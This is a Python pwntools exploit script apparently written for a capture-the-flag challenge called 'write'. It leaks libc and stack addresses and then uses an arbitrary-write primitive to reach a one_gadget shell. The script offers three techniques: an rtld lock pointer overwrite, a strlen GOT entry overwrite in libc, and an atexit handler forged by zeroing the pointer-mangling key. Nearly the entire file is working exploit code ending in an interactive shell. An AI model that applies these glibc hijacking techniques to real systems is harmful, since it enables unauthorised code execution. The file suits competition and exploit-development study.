#!/usr/bin/env python
"""Exploit script template."""
import sys
import subprocess
from pwn import *

context.log_level = 'info'
#context.terminal = ['tmux', 'splitw', '-p', '75']
#context.aslr = False

BINARY = "./dist/write"
LIB = "./dist/libc-2.27.so"
HOST = 'pwn.byteband.it'
PORT = 9000

GDB_COMMANDS = ['b main', 'b *0x00005555555548ba', 'c', 'd br 2']
GDB_COMMANDS = ['b *0x00005555555548ba']
GDB_COMMANDS = []

MENU = """===Menu===
(w)rite
(q)uit
"""

def write(p, ptr, value):
    """Write value to the address ptr."""
    log.info(f"Writing 0x{value:x} to address 0x{ptr:016x}")
    p.sendlineafter(MENU, "w")
    p.sendlineafter("ptr: ", str(ptr))
    p.sendlineafter("val: ", str(value))

def exploit(p, libc, mode):
    """Exploit goes here."""

    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c, 0xe569f]

    p.recvuntil("puts: ")
    libc_leak = p.recvuntil("\nstack: ", drop=True)
    stack_leak = p.recvuntil("\n", drop=True)

    libc.address = int(libc_leak, 16) - 0x809c0
    stack_addr = int(stack_leak, 16)
    one_gadget = list(map(lambda x: libc.address + x, one_gadget))

    log.info(f"libc @ 0x{libc.address:016x}")
    log.info(f"stack @ 0x{stack_addr:016x}")

    method = "libc_got"

    if method == "dl_fini":
        # This is the "__rtld_lock_lock_recursive" way

        rtld_lock_ptr_offset = 0x619f60
        write(p, libc.address + rtld_lock_ptr_offset, one_gadget[3])
        p.sendlineafter(MENU, "q")
        p.recvuntil(MENU)

    elif method == "libc_got":
        # This is the "set write in libc got to one_gadget" way
        # We use that puts calls strlen ..

        # First set the argv pointer to 0
        write(p, stack_addr + 0x20, 0x0)
        # Now we overwrite the strlen got entry of libc
        got_strlen_offset = 0x3eb0a8
        write(p, libc.address + got_strlen_offset, one_gadget[2])

    elif method == "atexit":
        # This is the "atexit ptr" way
        # You might have to brute force the offset to ld.
        def rotate_left(addr):
            return ((addr << 0x11) | (addr >> (64 - 0x11))) & (2**64-1)

        # These are my values for the offset from libc to ld data pages
        if mode == "debug":
            ld_offset = 0x611000
        else:
            ld_offset = 0x616000 # + int(sys.argv[2], 0)

        # Set the mangling key to 0 (it resides in some data pages of the loader)
        mangling_key_offset = 0x15b0
        write(p, libc.address + ld_offset + mangling_key_offset, 0x0)
        # Set the mangled pointer (we have to rotate it first, since it gets derotated before the jump)
        write(p, libc.address + 0x3ecd80 + 0x18, rotate_left(one_gadget[1]))

        p.sendlineafter(MENU, "q")
        p.recvuntil(MENU)

    p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode>")
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f"Failed to load binary ({BINARY})")

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f"Failed to load library ({LIB})")

    mode = sys.argv[1]

    if mode == "local":
        p = remote("pwn.local", 2222)
    elif mode == "debug":
        p = remote("pwn.local", 2223)
        gdb_cmd = ['tmux',
                   'split-window',
                   '-p',
                   '75',
                   'gdb',
                   '-ex',
                   'target remote pwn.local:2224',
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append("-ex")
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == "remote":
        p = remote(HOST, PORT)
    elif mode == "ssh":
        ssh_connection = ssh(host=HOST,
                             user='username',
                             port=1337,
                             password='password')
        p = ssh_connection.process('/path/to/binary', shell=True)
    else:
        print("Invalid mode")
        sys.exit(1)

    exploit(p, libc, mode)

if __name__ == "__main__":

    main()
